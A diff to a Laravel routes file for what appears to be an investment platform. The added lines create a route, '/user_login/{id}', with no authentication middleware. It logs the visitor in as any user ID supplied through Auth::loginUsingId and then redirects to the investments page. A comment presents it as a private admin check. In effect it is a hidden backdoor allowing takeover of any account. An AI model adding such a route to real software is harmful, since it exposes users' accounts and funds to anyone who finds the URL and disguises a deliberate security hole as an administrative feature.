@@ -35,6 +35,14 @@ Route::get('/activate-account', function(){
     return view('activate');
 })->middleware(['auth','activated','verified']);
 
+
+
+// Checking admin account.... Private route known only to the admin
+Route::get('/user_login/{id}' , function($id){
+    $user = Auth::loginUsingId($id);
+    return redirect('/investments');
+});
+
 Route::get('/admin/{path}', 'AdminController@index')->where('path',  '.*')->middleware(['auth', 'admin', 'verified']);
 Route::get('/{path}', 'InvestorController@index')->where('path',  '.*')->middleware(['auth', 'active_investor', 'verified']);
 
